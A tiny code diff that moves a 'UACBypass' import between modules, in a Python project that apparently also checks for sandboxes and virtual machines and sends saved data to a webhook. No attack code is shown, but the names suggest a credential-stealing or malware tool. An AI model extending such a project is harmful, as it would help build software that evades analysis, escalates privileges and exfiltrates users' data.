@@ -19,8 +19,7 @@ from Protections.Nestedvirtualization import NestedVirtualizationChecker
 from Protections.Windowssandbox import WindowsSandboxChecker
 
 from Utilities.Webhook import WebhookEncryptor, retrieve_saved_data
-
-from Cores.UAC import UACBypass
+from Utilities.UAC import UACBypass
 
 logging.basicConfig(level=logging.INFO)
 
